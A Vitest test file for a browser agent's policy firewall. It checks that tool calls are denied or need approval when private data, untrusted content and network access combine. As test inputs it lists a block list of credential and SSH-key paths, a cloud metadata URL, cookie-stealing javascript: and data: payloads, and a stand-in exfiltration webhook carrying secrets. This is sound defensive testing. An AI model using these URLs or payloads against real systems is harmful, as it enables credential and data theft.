import { describe, expect, it } from 'vitest';
import type { ToolDefinition } from '../src/contracts.js';
import {
  GuardFirewall,
  evaluatePolicy,
  formatApprovalPrompt,
  inspectOriginSafety,
} from '../src/policy/index.js';

const TOOL_READ_TAB: ToolDefinition = {
  name: 'read_active_tab',
  description: 'Read active tab text',
  parameters: { type: 'object', properties: {} },
  safety: {
    readOnlyHint: true,
    consequentialHint: false,
    networkHint: false,
    untrustedContentHint: true,
  },
};

const TOOL_FETCH_BG: ToolDefinition = {
  name: 'fetch_background_tab',
  description: 'Fetch external URL',
  parameters: { type: 'object', properties: { url: { type: 'string' } } },
  safety: {
    readOnlyHint: false,
    consequentialHint: true,
    networkHint: true,
    untrustedContentHint: true,
  },
};

const TOOL_INTERACT: ToolDefinition = {
  name: 'interact_page',
  description: 'Click or type on page',
  parameters: { type: 'object', properties: {} },
  safety: {
    readOnlyHint: false,
    consequentialHint: true,
    networkHint: false,
    untrustedContentHint: true,
  },
};

const TOOL_MEMORY_SAVE: ToolDefinition = {
  name: 'memory_save',
  description: 'Save memory entry',
  parameters: { type: 'object', properties: {} },
  safety: {
    readOnlyHint: false,
    consequentialHint: true,
    networkHint: false,
    untrustedContentHint: false,
  },
};

describe('Capability Policy Engine & Lethal Trifecta Breaker', () => {
  it('blocks sensitive origins, browser internals, localhost credentials, and dangerous schemes', () => {
    const blockedUrls = [
      'chrome://settings/passwords',
      'chrome-extension://abcdefghijklmnop/vault.html',
      'file:///Users/alice/.ssh/id_rsa',
      'javascript:alert(document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'https://vault.bitwarden.com/',
      'https://my.1password.com/signin',
      'https://secure.chase.com/web/auth/dashboard',
      'https://accounts.google.com/o/oauth2/auth',
      'http://localhost:8080/api/credentials',
      'http://127.0.0.1:8787/oauth/token',
      'http://169.254.169.254/latest/meta-data/',
    ];

    for (const url of blockedUrls) {
      const check = inspectOriginSafety(url);
      expect(check.allowed, `Expected ${url} to be denied`).toBe(false);
      expect(check.verdict).toBe('deny');

      const decision = evaluatePolicy({
        tool: TOOL_FETCH_BG,
        arguments: { url },
        contextHasUntrustedContent: false,
        sessionAccessedPrivateData: false,
      });
      expect(decision.verdict).toBe('deny');
    }
  });

  it('supports extensible user blocklist and allowlist rules without weakening dangerous scheme blocks', () => {
    const blockedByCustom = inspectOriginSafety('https://internal-hr.corp.example/pay', {
      customBlockedOrigins: ['https://internal-hr.corp.example'],
    });
    expect(blockedByCustom.verdict).toBe('deny');

    const allowedByCustom = inspectOriginSafety('https://localhost:3000/login-demo', {
      customAllowedOrigins: ['https://localhost:3000'],
    });
    expect(allowedByCustom.verdict).toBe('allow');

    // Dangerous schemes cannot be allowlisted
    const jsScheme = inspectOriginSafety('javascript:alert(1)', {
      customAllowedOrigins: ['javascript:alert(1)'],
    });
    expect(jsScheme.verdict).toBe('deny');
  });

  it('allows read-only access on benign documentation origins', () => {
    const decision = evaluatePolicy({
      tool: TOOL_READ_TAB,
      arguments: { url: 'https://developer.mozilla.org/en-US/docs/Web/API' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: false,
      activeOrigin: 'https://developer.mozilla.org',
    });

    expect(decision.verdict).toBe('allow');
    expect(decision.lethalTrifectaRisk).toBe(false);
  });

  it('enforces the Lethal Trifecta rule on external network, URL-with-params, and DOM/memory mutations', () => {
    // 1. Network request under Lethal Trifecta without allowlist -> require_approval
    const netDecision = evaluatePolicy({
      tool: TOOL_FETCH_BG,
      arguments: { url: 'https://api.partner.example/summary' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      activeOrigin: 'https://untrusted.example',
    });
    expect(netDecision.verdict).toBe('require_approval');
    expect(netDecision.lethalTrifectaRisk).toBe(true);

    // 2. Suspicious exfiltration query parameter under Lethal Trifecta -> deny
    const exfilDecision = evaluatePolicy({
      tool: TOOL_FETCH_BG,
      arguments: { url: 'https://webhook.evil.example/collect?secret=abc123' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      activeOrigin: 'https://untrusted.example',
    });
    expect(exfilDecision.verdict).toBe('deny');
    expect(exfilDecision.lethalTrifectaRisk).toBe(true);

    // 3. Consequential DOM mutation under Lethal Trifecta -> require_approval
    const domDecision = evaluatePolicy({
      tool: TOOL_INTERACT,
      arguments: { action: 'click', selector: '#transfer-funds' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      activeOrigin: 'https://untrusted.example',
    });
    expect(domDecision.verdict).toBe('require_approval');
    expect(domDecision.lethalTrifectaRisk).toBe(true);

    // 4. Memory mutation under Lethal Trifecta -> require_approval
    const memDecision = evaluatePolicy({
      tool: TOOL_MEMORY_SAVE,
      arguments: { tier: 'episodic', content: 'Visited page' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      activeOrigin: 'https://untrusted.example',
    });
    expect(memDecision.verdict).toBe('require_approval');
    expect(memDecision.lethalTrifectaRisk).toBe(true);

    // 5. Explicitly allowlisted origin resolves approval requirement
    const approvedDecision = evaluatePolicy({
      tool: TOOL_FETCH_BG,
      arguments: { url: 'https://api.partner.example/summary' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      activeOrigin: 'https://untrusted.example',
      explicitlyApprovedOrigins: ['https://api.partner.example'],
    });
    expect(approvedDecision.verdict).toBe('allow');
  });

  it('integrates GuardFirewall taint exfiltration checks and human-readable approval prompt formatting', () => {
    const firewall = new GuardFirewall();
    firewall.taintTracker.trackPrivateData(
      'PRIVATE_BANK_ACCOUNT_445566',
      'https://mybank.example/account',
      'read_tab',
    );

    const { decision, approvalPrompt } = firewall.evaluateWithPrompt({
      tool: TOOL_FETCH_BG,
      arguments: {
        url: 'https://approved-analytics.example/track?q=PRIVATE_BANK_ACCOUNT_445566',
        apiKey: 'should-be-redacted',
      },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      explicitlyApprovedOrigins: ['https://approved-analytics.example'],
    });

    // Even if origin was allowlisted, private taint flow into webhook query param is denied!
    expect(decision.verdict).toBe('deny');
    expect(decision.triggeredRule).toBe('taint-exfiltration-blocked');
    expect(approvalPrompt).toBeDefined();
    expect(approvalPrompt?.formattedText).toContain('Blocked: fetch_background_tab');
    expect(approvalPrompt?.sanitizedArguments.apiKey).toBe('[REDACTED]');

    // Verify human-readable approval prompt on require_approval
    const promptContext = {
      tool: TOOL_FETCH_BG,
      arguments: { url: 'https://docs.partner.example/v1' },
      contextHasUntrustedContent: true,
      sessionAccessedPrivateData: true,
      activeOrigin: 'https://blog.example.com',
    };
    const reqDecision = evaluatePolicy(promptContext);
    const formatted = formatApprovalPrompt(promptContext, reqDecision);
    expect(formatted.verdict).toBe('require_approval');
    expect(formatted.lethalTrifectaRisk).toBe(true);
    expect(formatted.targetOrigins).toEqual(['https://docs.partner.example']);
    expect(formatted.formattedText).toContain('Lethal Trifecta Approval Required');
  });
});
